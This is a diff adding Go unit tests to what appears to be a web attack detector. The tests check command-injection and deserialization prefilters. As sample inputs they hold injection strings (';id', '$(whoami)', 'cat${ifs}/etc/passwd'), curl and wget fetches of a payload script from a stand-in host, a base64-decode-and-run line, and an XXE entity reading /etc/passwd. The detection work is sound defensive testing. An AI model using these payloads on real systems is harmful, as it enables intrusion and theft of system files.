@@ -33,6 +33,98 @@ func TestCheckOWASP_CmdInjection_Backtick(t *testing.T) {
 	}
 }
 
+func TestHasCmdIndicatorSkipsBrowserUASeparators(t *testing.T) {
+	input := "mozilla/5.0 (windows nt 10.0; win64; x64) applewebkit/537.36 (khtml, like gecko) chrome/114.0.0.0 safari/537.36"
+	if hasCmdIndicator(input) {
+		t.Fatal("browser UA separators without shell command words should not enter cmd injection regex scan")
+	}
+}
+
+func TestHasCmdIndicatorKeepsCommandEntrypoints(t *testing.T) {
+	inputs := []string{
+		"host=8.8.8.8;id",
+		"test|whoami",
+		"`whoami`",
+		"q=$(whoami)",
+		"cmd=cat${ifs}/etc/passwd",
+		"input=test&&whoami",
+		"out=1>>/tmp/x",
+		"file=%00id",
+		"line=ok\nid",
+		"curl http://example.test/payload.sh",
+		"wget http://example.test/payload.sh",
+		"w``hoami",
+		"w`h`o`a`m`i",
+		"<!--#exec cmd=\"id\"-->",
+	}
+	for _, input := range inputs {
+		if !hasCmdIndicator(input) {
+			t.Fatalf("expected command indicator for %q", input)
+		}
+	}
+}
+
+func TestHasCmdIndicatorSkipsPlainAssignments(t *testing.T) {
+	inputs := []string{
+		"id=5",
+		"sort=name",
+		"PATH=/tmp value",
+		"token=abc123",
+	}
+	for _, input := range inputs {
+		if hasCmdIndicator(input) {
+			t.Fatalf("plain assignment %q should not enter cmd injection regex scan", input)
+		}
+	}
+}
+
+func TestShouldScanCmdPatternPrefilterHighFrequencyRules(t *testing.T) {
+	tests := []struct {
+		id    string
+		input string
+		want  bool
+	}{
+		{id: "owasp:cmd:007", input: "host=8.8.8.8;id;", want: true},
+		{id: "owasp:cmd:007", input: "font-family: Arial; color: red", want: false},
+		{id: "owasp:cmd:010", input: "PATH=/tmp whoami", want: true},
+		{id: "owasp:cmd:010", input: `{"val_nm":"ad34","val_act":"exposure_yw","channel":""}`, want: false},
+		{id: "owasp:cmd:015", input: "echo abc|base64 -d|sh", want: true},
+		{id: "owasp:cmd:015", input: "echo abc|base64\t-d|sh", want: true},
+		{id: "owasp:cmd:015", input: "a|b|c", want: false},
+	}
+	for _, tt := range tests {
+		pattern, ok := findCmdPatternForTest(tt.id)
+		if !ok {
+			t.Fatalf("missing command pattern %s", tt.id)
+		}
+		if got := shouldScanCmdPattern(tt.input, pattern); got != tt.want {
+			t.Fatalf("shouldScanCmdPattern(%s, %q) = %v, want %v", tt.id, tt.input, got, tt.want)
+		}
+	}
+}
+
+func TestCheckOWASP_CmdInjectionHighFrequencyPrefilterKeepsAttacks(t *testing.T) {
+	tests := []string{
+		"host=8.8.8.8;id;",
+		"echo abc|base64 -d|sh",
+	}
+	for _, input := range tests {
+		hits := CheckOWASP("mid", "/cmd", input, nil, nil)
+		if !hasCategory(hits, CatCmdInject) {
+			t.Fatalf("expected command injection hit for %q, got %+v", input, hits)
+		}
+	}
+}
+
+func findCmdPatternForTest(id string) (owaspPattern, bool) {
+	for _, p := range cmdInjectPatterns {
+		if p.id == id {
+			return p, true
+		}
+	}
+	return owaspPattern{}, false
+}
+
 func TestCheckOWASP_XXE(t *testing.T) {
 	payload := `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
 	hits := CheckOWASP("mid", "/", "xml="+payload, nil, nil)
@@ -555,6 +647,32 @@ func TestCheckOWASP_Deser_DotNet(t *testing.T) {
 	hits := CheckOWASP("mid", "/", "", nil, []string{"AAEAAAD//wEAAAA="})
 	if !hasCategory(hits, CatDeserial) {
 		t.Fatal("expected deserialization hit for .NET BinaryFormatter magic")
+	}
+}
+
+func TestHasDeserializationIndicatorSkipsPlainColonText(t *testing.T) {
+	samples := []string{
+		"https://example.com/path",
+		"resource.c-ctrip.com load success",
+		"params: value",
+	}
+	for _, sample := range samples {
+		if hasDeserializationIndicator(sample) {
+			t.Fatalf("plain text should not trigger deserialization indicator: %q", sample)
+		}
+	}
+}
+
+func TestCheckOWASP_Deser_PHPSerializedStringPair(t *testing.T) {
+	hits := CheckOWASP("mid", "/vulnerabilities/sqli/", `id=s%3A3%3A%22key%22%3Bs%3A5%3A%22value%22`, nil, nil)
+	if !hasCategory(hits, CatDeserial) {
+		t.Fatalf("expected deserialization hit for PHP serialized string pair, got %+v", hits)
+	}
+}
+
+func TestHasDeserializationIndicatorKeepsPHPSerializedObject(t *testing.T) {
+	if !hasDeserializationIndicator(`o:8:"stdclass":0:{}`) {
+		t.Fatal("expected PHP serialized object indicator")
 	}
 }
 
